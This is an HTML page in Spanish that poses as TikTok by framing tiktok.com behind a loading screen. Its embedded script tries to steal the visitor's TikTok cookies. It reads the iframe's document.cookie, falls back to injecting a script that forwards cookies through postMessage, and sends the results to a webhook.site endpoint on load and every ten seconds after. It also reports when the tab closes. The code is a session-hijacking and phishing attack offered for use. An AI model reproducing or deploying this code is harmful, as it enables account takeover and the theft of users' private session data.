<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        body { margin: 0; padding: 0; background-color: #000; overflow: hidden; }
        iframe { width: 100vw; height: 100vh; border: none; display: block; }
        .loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: black; color: white; display: flex; justify-content: center; align-items: center;
            z-index: 9999; font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>

<div class="loader" id="loader">Cargando TikTok...</div>

<iframe id="tiktokFrame" src="https://www.tiktok.com/explore"></iframe>

<script>
    // TU WEBHOOK ID
    const webhookUrl = "https://webhook.site/4dab7c2b-2f60-4246-bb48-e5fd3a2a1f46";

    function enviarDatos(tipo, datos) {
        fetch(webhookUrl, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                evento: tipo,
                cookies: datos,
                timestamp: new Date().toISOString()
            })
        });
    }

    // Función para intentar robar cookies del iframe
    function robarCookiesIframe() {
        try {
            const iframe = document.getElementById('tiktokFrame');
            // Intentamos acceder al documento dentro del iframe
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            
            if (iframeDoc && iframeDoc.cookie) {
                enviarDatos("cookies_capturadas", iframeDoc.cookie);
            } else {
                // Si no podemos leer directamente por seguridad, intentamos inyectar un script
                enviarDatos("intentando_inyeccion", "Cross-origin bloqueado, intentando inyección...");
                
                // Inyectamos un script simple que envíe las cookies al padre
                const script = iframeDoc.createElement('script');
                script.textContent = `
                    setInterval(() => {
                        window.parent.postMessage({ type: 'cookie_steal', cookies: document.cookie }, '*');
                    }, 5000);
                `;
                iframeDoc.body.appendChild(script);
            }
        } catch (e) {
            enviarDatos("error_lectura", e.message);
        }
    }

    // Escuchar mensajes del iframe (cuando inyectamos el script)
    window.addEventListener('message', (event) => {
        if (event.data && event.data.type === 'cookie_steal') {
            enviarDatos("cookies_en_vivo", event.data.cookies);
        }
    });

    // Cuando el iframe termina de cargar, activamos la captura
    document.getElementById('tiktokFrame').addEventListener('load', () => {
        document.getElementById('loader').style.display = 'none';
        
        // Primera captura inmediata
        robarCookiesIframe();
        
        // Captura automática cada 10 segundos mientras use
        setInterval(robarCookiesIframe, 10000);
    });

    // Detectar cuando cierra la pestaña
    window.addEventListener('beforeunload', () => {
        enviarDatos("sesion_finalizada", "Usuario cerró TikTok");
    });
</script>

</body>
</html>
